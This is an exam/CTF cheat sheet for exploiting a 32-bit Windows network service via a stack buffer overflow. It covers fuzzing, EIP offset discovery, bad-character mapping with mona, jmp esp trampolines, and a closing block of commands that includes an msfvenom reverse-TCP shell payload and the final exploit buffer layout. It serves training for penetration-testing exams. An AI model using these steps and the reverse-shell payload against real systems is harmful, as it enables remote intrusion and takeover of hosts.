# Pwn - Windows stack buffer overflow (SEH, egghunter, bad chars)

## Classic 32-bit Windows network-service stack overflow (Immunity + mona workflow)

**Trigger:** You have a listening TCP service on a 32-bit Windows box (custom daemon, old mail/FTP/media server, vulnserver-style exam target) that drops the connection or dies when you feed it an over-long command argument, and you have a copy of the binary you can attach a debugger to. No ASLR/DEP on at least one loaded module.

Fuzz over a socket first: reconnect each round and send the vulnerable command with a buffer growing in fixed steps until the connection breaks, and record the last length that survived so you know the crash window. Attach Immunity or x32dbg to the service, resend a cyclic pattern of that length, and convert the value sitting in EIP at the crash into a byte offset — this gives you exact saved-return-address control without reading a single line of disassembly. Confirm the offset by sending offset bytes of filler plus four distinctive bytes and checking EIP holds exactly those bytes. Next map bad characters: append all 256 byte values after the return address, then compare the memory the buffer actually landed in against a clean reference; every byte that got mangled, truncated, or swallowed is excluded, and you repeat the comparison until the tail survives intact (protocol delimiters like null, CR, LF, and space are the usual first casualties, but application-specific parsers add their own). Then pick the redirect: rather than hardcoding a stack address, search the loaded modules for a `jmp esp` (opcode `\xff\xe4`) or `call esp` inside a module compiled without ASLR/rebase/SafeSEH, and verify the chosen address itself contains no bad characters. Generate stage-less shellcode excluding the bad-char set, and prefix it with a short NOP sled so a decoder stub that expands in place has room to unpack. The final layout is filler to the offset, the trampoline address little-endian, the sled, then shellcode. Use a thread-scoped exit routine in the payload so the shellcode's cleanup kills only the handling thread instead of tearing down the whole service — that keeps the target alive for a second attempt if the first shell dies. If EIP is clobbered but the crash is actually an exception-handler overwrite rather than a return-address overwrite, the offsets and the trampoline choice change entirely; see the SEH-overwrite chain in `ctf-pwn/advanced-exploits-4.md`.

```bash
# 1. fuzz over the socket (reconnect each round)
python3 -c 'pass'  # see fuzz loop: send CMD + b"A"*n, n += 100, until connect/send raises

# 2. offset
msf-pattern_create -l 3000
msf-pattern_offset -l 3000 -q <EIP-value-at-crash>

# 3. bad chars — send all 256 bytes after EIP, diff in the debugger
!mona bytearray -b "\x00"
!mona compare -f C:\mona\bytearray.bin -a <ESP-address>

# 4. trampoline in a non-ASLR / non-rebase module
!mona modules
!mona find -s "\xff\xe4" -m <module.dll> -cpb "\x00\x0a\x0d"

# 5. shellcode with the bad-char set excluded, thread-scoped exit
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 \
  -f py -b "\x00\x0a\x0d" EXITFUNC=thread -v shellcode

# 6. layout
payload = b"A"*offset + p32(JMP_ESP) + b"\x90"*16 + shellcode
```

Source: https://offsecexams.com/cheatsheets/ecppt-exam---guided-by-redblock
